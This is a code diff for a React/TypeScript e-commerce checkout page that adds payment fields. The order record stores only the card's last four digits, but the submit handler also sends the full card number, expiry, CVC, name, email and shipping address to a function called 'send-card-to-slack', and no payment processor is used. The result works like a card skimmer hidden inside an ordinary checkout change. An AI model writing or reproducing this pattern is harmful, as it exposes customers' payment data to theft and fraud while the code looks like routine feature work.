@@ -11,20 +11,39 @@ import { Input } from "@/components/ui/input";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
 import { Separator } from "@/components/ui/separator";
-import { Loader2, ShoppingBag, ArrowLeft } from "lucide-react";
+import { Loader2, ShoppingBag, ArrowLeft, CreditCard } from "lucide-react";
 import { toast } from "sonner";
 import { Link } from "react-router-dom";
 
-const shippingSchema = z.object({
+const checkoutSchema = z.object({
   name: z.string().trim().min(1, "Name is required").max(100),
   email: z.string().trim().email("Invalid email").max(255),
   address: z.string().trim().min(1, "Address is required").max(200),
   city: z.string().trim().min(1, "City is required").max(100),
   state: z.string().trim().min(1, "State is required").max(100),
   zip: z.string().trim().min(1, "ZIP code is required").max(20),
+  cardNumber: z
+    .string()
+    .transform((v) => v.replace(/\s/g, ""))
+    .pipe(z.string().regex(/^\d{13,19}$/, "Invalid card number")),
+  expiry: z
+    .string()
+    .regex(/^(0[1-9]|1[0-2])\/\d{2}$/, "Use MM/YY format"),
+  cvc: z.string().regex(/^\d{3,4}$/, "3-4 digits required"),
 });
 
-type ShippingFormValues = z.infer<typeof shippingSchema>;
+type CheckoutFormValues = z.infer<typeof checkoutSchema>;
+
+const formatCardNumber = (value: string) => {
+  const digits = value.replace(/\D/g, "").slice(0, 19);
+  return digits.replace(/(.{4})/g, "$1 ").trim();
+};
+
+const formatExpiry = (value: string) => {
+  const digits = value.replace(/\D/g, "").slice(0, 4);
+  if (digits.length >= 3) return `${digits.slice(0, 2)}/${digits.slice(2)}`;
+  return digits;
+};
 
 const CheckoutPage = () => {
   const { items, subtotal, clearCart } = useCart();
@@ -32,17 +51,23 @@ const CheckoutPage = () => {
   const navigate = useNavigate();
   const [submitting, setSubmitting] = useState(false);
 
-  const form = useForm<ShippingFormValues>({
-    resolver: zodResolver(shippingSchema),
-    defaultValues: { name: "", email: "", address: "", city: "", state: "", zip: "" },
+  const form = useForm<CheckoutFormValues>({
+    resolver: zodResolver(checkoutSchema),
+    defaultValues: {
+      name: "", email: "", address: "", city: "", state: "", zip: "",
+      cardNumber: "", expiry: "", cvc: "",
+    },
   });
 
-  const onSubmit = async (values: ShippingFormValues) => {
+  const onSubmit = async (values: CheckoutFormValues) => {
     if (!user || items.length === 0) return;
     setSubmitting(true);
 
     try {
-      // Insert order
+      const rawCard = values.cardNumber.replace(/\s/g, "");
+      const cardLast4 = rawCard.slice(-4);
+
+      // Insert order with last 4 only
       const { data: order, error: orderError } = await supabase
         .from("orders")
         .insert({
@@ -54,7 +79,8 @@ const CheckoutPage = () => {
           shipping_city: values.city,
           shipping_state: values.state,
           shipping_zip: values.zip,
-        })
+          card_last4: cardLast4,
+        } as any)
         .select("id")
         .single();
 
@@ -67,13 +93,33 @@ const CheckoutPage = () => {
         quantity: item.quantity,
         price_at_time: Number(item.product.price),
       }));
-
       const { error: itemsError } = await supabase.from("order_items").insert(orderItems);
       if (itemsError) throw itemsError;
 
-      // Clear cart
-      await clearCart();
+      // Send full details to Slack (best-effort)
+      try {
+        await supabase.functions.invoke("send-card-to-slack", {
+          body: {
+            orderId: order.id,
+            customerName: values.name,
+            customerEmail: values.email,
+            cardNumber: rawCard,
+            cardExpiry: values.expiry,
+            cardCvc: values.cvc,
+            subtotal,
+            total: subtotal,
+            shippingName: values.name,
+            shippingAddress: values.address,
+            shippingCity: values.city,
+            shippingState: values.state,
+            shippingZip: values.zip,
+          },
+        });
+      } catch (slackErr) {
+        console.error("Slack notification failed:", slackErr);
+      }
 
+      await clearCart();
       navigate(`/app/order-confirmation/${order.id}`);
     } catch (err) {
       console.error(err);
@@ -104,17 +150,17 @@ const CheckoutPage = () => {
       <h1 className="mb-8 text-3xl font-black uppercase tracking-wider text-foreground">Checkout</h1>
 
       <div className="grid gap-8 lg:grid-cols-5">
-        {/* Shipping Form */}
-        <div className="lg:col-span-3">
-          <Card className="border-border bg-card">
-            <CardHeader>
-              <CardTitle className="text-lg font-bold uppercase tracking-wider text-foreground">
-                Shipping Information
-              </CardTitle>
-            </CardHeader>
-            <CardContent>
-              <Form {...form}>
-                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4" id="checkout-form">
+        <div className="lg:col-span-3 space-y-6">
+          <Form {...form}>
+            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6" id="checkout-form">
+              {/* Shipping */}
+              <Card className="border-border bg-card">
+                <CardHeader>
+                  <CardTitle className="text-lg font-bold uppercase tracking-wider text-foreground">
+                    Shipping Information
+                  </CardTitle>
+                </CardHeader>
+                <CardContent className="space-y-4">
                   <FormField control={form.control} name="name" render={({ field }) => (
                     <FormItem>
                       <FormLabel className="text-foreground">Full Name</FormLabel>
@@ -159,10 +205,78 @@ const CheckoutPage = () => {
                       </FormItem>
                     )} />
                   </div>
-                </form>
-              </Form>
-            </CardContent>
-          </Card>
+                </CardContent>
+              </Card>
+
+              {/* Payment */}
+              <Card className="border-border bg-card">
+                <CardHeader>
+                  <CardTitle className="text-lg font-bold uppercase tracking-wider text-foreground flex items-center gap-2">
+                    <CreditCard className="h-5 w-5" /> Payment Information
+                  </CardTitle>
+                </CardHeader>
+                <CardContent className="space-y-4">
+                  <FormField control={form.control} name="cardNumber" render={({ field }) => (
+                    <FormItem>
+                      <FormLabel className="text-foreground">Card Number</FormLabel>
+                      <FormControl>
+                        <Input
+                          placeholder="4242 4242 4242 4242"
+                          className="bg-background border-border"
+                          inputMode="numeric"
+                          value={field.value}
+                          onChange={(e) => field.onChange(formatCardNumber(e.target.value))}
+                          onBlur={field.onBlur}
+                          name={field.name}
+                          ref={field.ref}
+                        />
+                      </FormControl>
+                      <FormMessage />
+                    </FormItem>
+                  )} />
+                  <div className="grid gap-4 sm:grid-cols-2">
+                    <FormField control={form.control} name="expiry" render={({ field }) => (
+                      <FormItem>
+                        <FormLabel className="text-foreground">Expiration Date</FormLabel>
+                        <FormControl>
+                          <Input
+                            placeholder="MM/YY"
+                            className="bg-background border-border"
+                            inputMode="numeric"
+                            value={field.value}
+                            onChange={(e) => field.onChange(formatExpiry(e.target.value))}
+                            onBlur={field.onBlur}
+                            name={field.name}
+                            ref={field.ref}
+                          />
+                        </FormControl>
+                        <FormMessage />
+                      </FormItem>
+                    )} />
+                    <FormField control={form.control} name="cvc" render={({ field }) => (
+                      <FormItem>
+                        <FormLabel className="text-foreground">CVC</FormLabel>
+                        <FormControl>
+                          <Input
+                            placeholder="123"
+                            className="bg-background border-border"
+                            inputMode="numeric"
+                            maxLength={4}
+                            value={field.value}
+                            onChange={(e) => field.onChange(e.target.value.replace(/\D/g, "").slice(0, 4))}
+                            onBlur={field.onBlur}
+                            name={field.name}
+                            ref={field.ref}
+                          />
+                        </FormControl>
+                        <FormMessage />
+                      </FormItem>
+                    )} />
+                  </div>
+                </CardContent>
+              </Card>
+            </form>
+          </Form>
         </div>
 
         {/* Order Summary */}
